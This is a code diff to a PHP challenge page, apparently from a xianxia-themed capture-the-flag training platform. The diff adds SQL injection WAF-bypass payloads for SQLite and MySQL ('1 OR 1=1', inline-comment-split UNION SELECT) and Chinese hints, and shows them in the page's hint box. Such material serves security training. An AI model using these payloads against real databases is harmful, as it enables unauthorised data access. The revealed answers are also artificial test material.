@@ -1,4 +1,5 @@
 <?php
+require_once __DIR__ . '/../../../../app/bootstrap_challenge.php';
 /**
  * WM-JD-08 【万魔宗·金丹】护山结界
  * 修真叙事：万魔宗的山门有护山大阵（WAF）阻挡入侵。
@@ -6,6 +7,13 @@
  * 难度：L3
  * 宗门：wanmozong
  */
+if (xxr_db_driver() === 'sqlite') {
+    $sqliWafPayload = "1 OR 1=1-- -";
+    $sqliWafHint = '黑名单未拦 OR/恒真式，直接绕过（内联注释拼接 uni/**/on 利用 MySQL 词法特性，SQLite 将注释视为空白、不可用）';
+} else {
+    $sqliWafPayload = '-1 uni/**/on sel/**/ect version()-- -';
+    $sqliWafHint = '利用大小写无意义（黑名单已忽略大小写）、内联注释拼接关键字绕过';
+}
 ?>
 <!DOCTYPE html>
 <html lang="zh-CN">
@@ -29,7 +37,7 @@
             </div>
         </form>
         <div class="alert alert-info mt-4">
-            <strong>💡 习道提示：</strong> SQL 注入 WAF 绕过（大小写、注释符）
+            <strong>💡 习道提示：</strong> SQL 注入 WAF 绕过。<?= $sqliWafHint ?>。Payload: <code><?= e($sqliWafPayload) ?></code>
             <hr>
             Flag 提交位置：<a href="/challenge/WM-JD-08" class="text-gold">返回关卡详情页</a> 提交。
         </div>
